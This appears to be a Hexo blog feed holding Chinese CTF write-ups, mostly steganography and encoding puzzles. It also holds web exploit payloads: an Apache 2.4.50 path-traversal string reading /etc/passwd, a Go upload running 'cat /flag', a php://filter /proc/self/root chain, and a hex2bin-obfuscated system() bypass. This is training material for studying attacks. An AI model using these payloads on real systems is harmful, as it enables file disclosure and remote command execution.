title="(3)getme"></a>(3)getme</h3><p>知识点:apache2.4.50目录穿透</p><p>启动靶场发现</p><p>测试发现时apache2.4.50,该版本具有目录穿越的漏洞</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed00d4b1b.jpg" alt="QQ截图20220803112318.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure><p>测试发现确实存在漏洞</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed0f92239.jpg" alt="QQ截图20220803112847.jpg"></p><p>访问日志查看是否有flag的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%%32%65/logs/access_log</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed155a87f.jpg" alt="QQ截图20220803113003.jpg"></p><p>找到flag相关信息一个一个进行访问发现前面的都显示400当最后一个的时候回显flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed101486e.jpg" alt="QQ截图20220803113148.jpg"></p><h3 id="4-hackme"><a href="#4-hackme" class="headerlink" title="(4)hackme"></a>(4)hackme</h3><p>知识点:go语言</p><p>开启靶场</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec955f44e17.jpg" alt="QQ截图20220805114621.jpg"></p><p>第一眼看到也没什么想法随便点点看</p><p>process:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec97db40905.jpg" alt="QQ截图20220805120845.jpg"></p><p>log:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec97eb6b4ad.jpg" alt="QQ截图20220805120907.jpg"></p><p>whoami:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec97f93a58a.jpg" alt="QQ截图20220805120920.jpg"></p><p>whereami</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec98094deb3.jpg" alt="QQ截图20220805120937.jpg"></p><p>users:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec9817ccf9a.jpg" alt="QQ截图20220805120952.jpg"></p><p>发现类似于每一个页面里面是一种命令执行</p><p>users显示没有找到users.go这个文件，又发现有一个.go文件的上传点，所以猜测这里是上传一个.go的文件然后点击后会对应寻找.go文件进行命令执行</p><p>这里上网寻找一个cat&#x2F;flag的go语言脚本（go语言完全没有接触过），然后以flag.go上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"> </span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">func main() &#123;</span><br><span class="line">    Command(&quot;cat /flag&quot;)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func Command(cmd string) error &#123;</span><br><span class="line">c := exec.Command(&quot;bash&quot;, &quot;-c&quot;, cmd)</span><br><span class="line">output, err := c.CombinedOutput()</span><br><span class="line">fmt.Println(string(output))</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec974fdc397.jpg" alt="QQ截图20220805120632.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;1-不懂PCB的厨师不是好黑客&quot;&gt;&lt;a href=&quot;#1-不懂PCB的厨师不是好黑客&quot; class=&quot;header</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="http://just-aleaf.github.io/2022/08/01/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <id>http://just-aleaf.github.io/2022/08/01/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B/</id>
    <published>2022-07-31T17:06:01.000Z</published>
    <updated>2022-08-02T12:21:59.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dest0g3-520迎新赛"><a href="#Dest0g3-520迎新赛" class="headerlink" title="Dest0g3 520迎新赛"></a>Dest0g3 520迎新赛</h1><h2 id="1-AI"><a href="#1-AI" class="headerlink" title="1.AI"></a>1.AI</h2><h3 id="1-OCR"><a href="#1-OCR" class="headerlink" title="(1)OCR"></a>(1)OCR</h3><p>下载发现是一个凌乱的图片<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8878f02a0f.jpg" alt="QQ截图20220802100141.jpg"><br>尝试使用010 Editor（这里为什么使用该编译器，因为改编译器会提示CRC错误)</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8878f530ba.jpg" alt="QQ截图20220802100150.jpg"></p><p>这里发现CRC报错说明宽或高方面有问题<br>上网找一个脚本进行宽高的修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line"> </span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">import  binascii</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">file = &#x27;flag_pic (2).png&#x27;//只需要将这里的file名改为对应文件名即可</span><br><span class="line"> </span><br><span class="line">fr = open(file,&#x27;rb&#x27;).read()</span><br><span class="line"> </span><br><span class="line">data = bytearray(fr[12:29])</span><br><span class="line"> </span><br><span class="line">crc32key = struct.unpack(&#x27;&gt;I&#x27;,fr[29:33])[0]&amp;0xffffffff</span><br><span class="line"> </span><br><span class="line">print(crc32key)</span><br><span class="line"> </span><br><span class="line">n = 4096</span><br><span class="line"> </span><br><span class="line">for w in range(n):</span><br><span class="line"> </span><br><span class="line">    width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))</span><br><span class="line"> </span><br><span class="line">    for h in range(n):</span><br><span class="line"> </span><br><span class="line">        height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h))</span><br><span class="line"> </span><br><span class="line">        for x in range(4):</span><br><span class="line"> </span><br><span class="line">            data[x+4] = width[x]</span><br><span class="line"> </span><br><span class="line">            data[x+8] = height[x]</span><br><span class="line"> </span><br><span class="line">            #print(data)</span><br><span class="line"> </span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line"> </span><br><span class="line">        if crc32result == crc32key:</span><br><span class="line"> </span><br><span class="line">            print(crc32key)</span><br><span class="line"> </span><br><span class="line">            print(width,height)</span><br><span class="line"> </span><br><span class="line">            print(data)</span><br><span class="line"> </span><br><span class="line">            newpic = bytearray(fr)</span><br><span class="line"> </span><br><span class="line">            for x in range(4):</span><br><span class="line"> </span><br><span class="line">                newpic[x+16] = width[x]</span><br><span class="line"> </span><br><span class="line">                newpic[x+20] = height[x]</span><br><span class="line"> </span><br><span class="line">            fw = open(file+&#x27;.png&#x27;,&#x27;wb&#x27;)</span><br><span class="line"> </span><br><span class="line">            fw.write(newpic)</span><br><span class="line"> </span><br><span class="line">            fw.close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8878ff2719.jpg" alt="QQ截图20220802100156.jpg"><br>运行得到正常文件<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893b9ad5a8.jpg" alt="QQ截图20220802100203.jpg"><br>这里获得的是一个图片这里就呼应了题目用到了OCR<br><a href="https://uutool.cn/ocr/">https://uutool.cn/ocr/</a><br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8939f64954.jpg" alt="QQ截图20220802100210.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">377 ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022</span><br><span class="line">94A676D2FDE351A055C168F9710364AE2D581126E378F3B4C47E15E2E80B74234B849430A221F40</span><br><span class="line">C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2</span><br><span class="line">E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D03579</span><br><span class="line">95A2FB65D31CD99C853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FF</span><br><span class="line">E31ED0COCEFOCAOB68COCCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFCOFEAA</span><br><span class="line">E92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF</span><br><span class="line">66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EF</span><br><span class="line">DE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07</span><br><span class="line">097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C55</span><br><span class="line">95E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074C27F81C719D98717F4ECD</span><br><span class="line">32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F060</span><br><span class="line">0FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A03</span><br><span class="line">95DB9A445B94C44771B406F962B1CFC8535BA0D3EE3 DDDEB876C95092AAB192B168A732F3A7B9E81</span><br><span class="line">56C403C583983F5527A0D6C5D6928481D56955474046D9FC17A2DE21F3D6FC4C69644E7C6A141BE9</span><br><span class="line">48A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B0100012121</span><br><span class="line">01000C84D100080A0196EAFE6000000501190A000000000000000000001119004400650073007400</span><br><span class="line">3000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000</span><br><span class="line">000000</span><br></pre></td></tr></table></figure><p>发现对应的十六进制我们将其放入编辑器<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893d3f274d.jpg" alt="QQ截图20220802100219.jpg"><br>发现是zip文件<br>解压即可得到一个txt文件<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893e2530ff.jpg" alt="QQ截图20220802100225.jpg"><br>发现中间base64加密密文解密即可获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893fea5c30.jpg" alt="QQ截图20220802100231.jpg"></p><h3 id="2-The-correct-flag"><a href="#2-The-correct-flag" class="headerlink" title="(2)The correct flag"></a>(2)The correct flag</h3><p>下载附件发现有好多看不到的数据尝试复制粘贴到记事本发现出现数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941e99fdd.jpg" alt="QQ截图20220802100237.jpg"><br>然后就是词汇分析表示摆烂没搞懂</p><h2 id="2-MISC"><a href="#2-MISC" class="headerlink" title="2.MISC"></a>2.MISC</h2><h3 id="1-Pngenius"><a href="#1-Pngenius" class="headerlink" title="(1)Pngenius"></a>(1)Pngenius</h3><p>下载附件是一张照片<br>一张照片还是misc不管三七二十一先zsteg看看有没有隐写内容<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941eda02a.jpg" alt="QQ截图20220802100244.jpg"><br>发现一个zip密码说明内藏了一个zip文件<br>所以就在使用binwalk分离一波<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941f31424.jpg" alt="QQ截图20220802100308.jpg"><br>反手分离出来<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941fdd917.jpg" alt="QQ截图20220802100313.jpg"><br>写入zip密码解压即可获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8942085968.jpg" alt="QQ截图20220802100318.jpg"></p><h3 id="2-EasyEncode"><a href="#2-EasyEncode" class="headerlink" title="(2)EasyEncode"></a>(2)EasyEncode</h3><p>下载附件是个zip文件解压有密码<br>先来试试伪加密防止搞半天白搞<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8942239dc1.jpg" alt="QQ截图20220802100327.jpg"><br>发现不是伪加密</p><p>那就用ziperello暴力破解一下<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c11e334.jpg" alt="QQ截图20220802100333.jpg"><br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c19a7e9.jpg" alt="QQ截图20220802100339.jpg"><br>得出密码位100861<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c31acd9.jpg" alt="QQ截图20220802100345.jpg"><br>得到一段摩斯密码解密得到十六进制数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e895416145d.jpg" alt="QQ截图20220802110840.jpg"><br>将内容放到编辑器查看获得unicode编码数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c24df79.jpg" alt="QQ截图20220802100359.jpg"><br>进行转中文<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c368353.jpg" alt="QQ截图20220802100411.jpg"><br>发现又url编码再次解码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c3df7d7.jpg" alt="QQ截图20220802100418.jpg"><br>获得base64编码再次解码获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c4c61cd.jpg" alt="QQ截图20220802100424.jpg"></p><h3 id="3-你知道js吗"><a href="#3-你知道js吗" class="headerlink" title="(3)你知道js吗"></a>(3)你知道js吗</h3><p>下载附件习惯性查看一下16进制<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c576100.jpg" alt="QQ截图20220802100431.jpg"><br>发现xml尝试修改后缀为doc<br>打开获得一串数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c63b2ca.jpg" alt="QQ截图20220802100444.jpg"><br>发现是base64编码的格式<br>解码获得数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c8e24c0.jpg" alt="QQ截图20220802100453.jpg"><br>发现url编码特点解码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c816605.jpg" alt="QQ截图20220802100504.jpg"><br>发现了brainfuck的特点再次解码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c92f8b0.jpg" alt="QQ截图20220802100511.jpg"><br>获得十六进制数据放入即可获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e894c996a8c.jpg" alt="QQ截图20220802100516.jpg"></p><h3 id="4-StrangeTraffic"><a href="#4-StrangeTraffic" class="headerlink" title="(4)StrangeTraffic"></a>(4)StrangeTraffic</h3><p>没看懂获取tcp后的步骤之后搞懂再补充</p><h3 id="5-EasyWord"><a href="#5-EasyWord" class="headerlink" title="(5)EasyWord"></a>(5)EasyWord</h3><p>下载附件返现doc和rar多进行了加密只有hint没有加密<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e896671299b.jpg" alt="QQ截图20220802100521.jpg"><br>查看发现这提示掩码攻击<br>然后就不懂了</p><h3 id="6-Python-jail"><a href="#6-Python-jail" class="headerlink" title="(6)Python_jail"></a>(6)Python_jail</h3><p>下载附件发现有三个文件，一个内容为介绍，一个为空，一个是一个加密的zip<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e896669ecb3.jpg" alt="QQ截图20220802100529.jpg"></p><p>更具介绍和空白想到空白编码上工具<br><a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a><br>将空白的编码输入进去进行解密<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e897d50936b.jpg" alt="QQ截图20220802100536.jpg"><br>解密获得照片</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8966871f4d.jpg" alt="QQ截图20220802100546.jpg"><br>看到照片首先想到lsb</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e896692c01f.jpg" alt="QQ截图20220802100702.jpg"><br>获得得到base64编码<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8980feeee7.jpg" alt="QQ截图20220802100709.jpg"><br>base64解码得到flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8982f44e10.jpg" alt="QQ截图20220802100715.jpg"></p><h3 id="7-codegame"><a href="#7-codegame" class="headerlink" title="(7)codegame"></a>(7)codegame</h3><p>下载附件名字叫zip那就尝试修改后缀为zip进行解压发现两个文件<br>查看文档发现是LOLCODE编码尝试运行<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9109587430.jpg" alt="QQ截图20220802100720.jpg"><br><a href="https://www.dcode.fr/lolcode-language">https://www.dcode.fr/lolcode-language</a><br>网站运行<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e910e78d3f5.jpg" alt="QQ截图20220802100726.jpg"></p><p>输入密码解压然后发现还有一个doc文件进去发现是空白摆烂想到题目里面zip改后缀为zip再试试<br>解压发现fllllll1ag文件打开发现是表情果断解密<br><a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a><br>把解压密码带入key尝试解密发现解密不出来<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e89668128e1.jpg" alt="QQ截图20220802100739.jpg"></p><p>有解不出来摆烂摆烂摆烂然后看到advanced尝试修改发现4时解密成功<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91101bd7cb.jpg" alt="QQ截图20220802100744.jpg"><br>解密出来16进制数据进行编译器查看<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9110ed0d00.jpg" alt="QQ截图20220802100749.jpg"></p><h3 id="被污染的二维码"><a href="#被污染的二维码" class="headerlink" title="被污染的二维码"></a>被污染的二维码</h3><p>下载附件发现时一个zip文件名的文件尝试修改后缀位zip<br>发现得到两个文件都拉进010看看十六进制<br>在这里插入图片描述<img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9112aadb23.jpg" alt="QQ截图20220802100755.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9112b33a68.jpg" alt="QQ截图20220802100801.jpg"><br>发现一个是png文件一个是7z文件<br>尝试将png文件进行binwalk分离<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9113f622a0.jpg" alt="QQ截图20220802100807.jpg"><br>获<img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9119587879.jpg" alt="QQ截图20220802195907.jpg"><br>再看flag2的十六进制的数据发现文件头有问题<br>正常zip的文件头为377ABCAF<br>更改另存为zip即可获取<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91149382a4.jpg" alt="QQ截图20220802100813.jpg">)<br>使用刚才的密码即可解压获取到一串数据</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e911cc240e4.jpg" alt="QQ截图20220802100820.jpg">发现足有127列猜测是零宽<br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a><br>网站开解<br>这里解释后要选择前三个（没有理解为什么要选前三个理解之后再回来写）<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e911e225e0f.jpg" alt="QQ截图20220802100827.jpg"><br><img src="/hello-world-1/bd8ab48bebc544b5899af2e8872ea91d.png" alt="在这里插入图片描述"><br>发下隐藏的是N-ZA-M对应想到rot13那就再去rot13一波<br><a href="http://www.mxcz.net/tools/rot13.aspx">http://www.mxcz.net/tools/rot13.aspx</a><br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91200e446b.jpg" alt="QQ截图20220802100838.jpg"><br>一看芜湖base64来了解密解密解密<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9120cded1a.jpg" alt="QQ截图20220802100844.jpg"><br>崩了啊怎么还隐藏四位<br>只能跑回flag1的照片里面再试试修改后缀为png然后发现磨碎的二维码然后尝试修复<br><a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a><br>表示对该工具不熟悉我尝试拖进去一直拖不进去没法下一步修补之后扫描即可获得中间四位得到完整二维码</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><p>方法一<br>进入靶机查看发现有require_once要绕过该函数（只要包含过一次便不会包含）然后读取flag4的内容<br>常见的方法就想到了伪协议和多级符号链接的方法结合绕过<br>这里就要了解&#x2F;proc&#x2F;self和&#x2F;proc&#x2F;self&#x2F;root的含义<br>&#x2F;proc&#x2F;self&#x2F;指当前进程，而&#x2F;proc&#x2F;self&#x2F;root&#x2F;指’’&#x2F;‘’<br>这里如果我们知识使用一些proc&#x2F;self&#x2F;root的话最后也会被转化变为正确的路径导致无法绕过，但凡事都有一个上限当我们超过他所能接受的上限就可以导致其无法识别进而无法转换达到绕过的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9129fca893.jpg" alt="QQ截图20220802200234.jpg"><br>进行base64转换即可获取到flag</p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><p>下载靶机发现没什么思路那就代码分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);  //提高亮度没什么用</span><br><span class="line">include &quot;fl4g.php&quot;;</span><br><span class="line">$dest0g3 = $_POST[&#x27;ctf&#x27;];//post传入擦书</span><br><span class="line">$time = date(&quot;H&quot;);//设置时间参数</span><br><span class="line">$timme = date(&quot;d&quot;);</span><br><span class="line">$timmme = date(&quot;i&quot;);</span><br><span class="line">if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;//条件判断时间超过24小时或者超过31天或者超过60s都是无法实现的</span><br><span class="line">    echo $fl4g;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Try harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(//该函数用我的理解就是自己设置报错方式</span><br><span class="line">    function() use(&amp;$fl4g) &#123;</span><br><span class="line">        print $fl4g;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$fl4g .= $dest0g3;</span><br><span class="line">?&gt; Try harder!</span><br></pre></td></tr></table></figure><p>由于上面if语句根本不可能实现<br>所以我们就要尝试利用函数set_error_hander进行报错输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=123</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e912a125436.jpg" alt="QQ截图20220802200258.jpg"></p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e912f903436.jpg" alt="QQ截图20220802200504.jpg"><br>一进去就看到一堆过滤词汇直接奔溃<br>然后看代码发现str_replace函数一般该函数都是用hex2bin()进行绕过同时发现’()‘和单引号没有过滤那就肯定了这一做法<br>hex2bin的用法大家可以自行百度<br>然后绕过机制就为post传入aaa&#x3D;hex2bin(‘73797374656d’)(hex2bin(‘636174202f666c6167’));&#x2F;&#x2F;system(cat &#x2F;flag)<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e912a1b86a1.jpg" alt="QQ截图20220802200308.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Dest0g3-520迎新赛&quot;&gt;&lt;a href=&quot;#Dest0g3-520迎新赛&quot; class=&quot;headerlink&quot; title=&quot;Dest0g3 520迎新赛&quot;&gt;&lt;/a&gt;Dest0g3 520迎新赛&lt;/h1&gt;&lt;h2 id=&quot;1-AI&quot;&gt;&lt;a href=&quot;#1</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://just-aleaf.github.io/2022/08/01/hello-world/"/>
    <id>http://just-aleaf.github.io/2022/08/01/hello-world/</id>
    <published>2022-07-31T17:02:01.949Z</published>
    <updated>2022-07-31T17:02:01.949Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
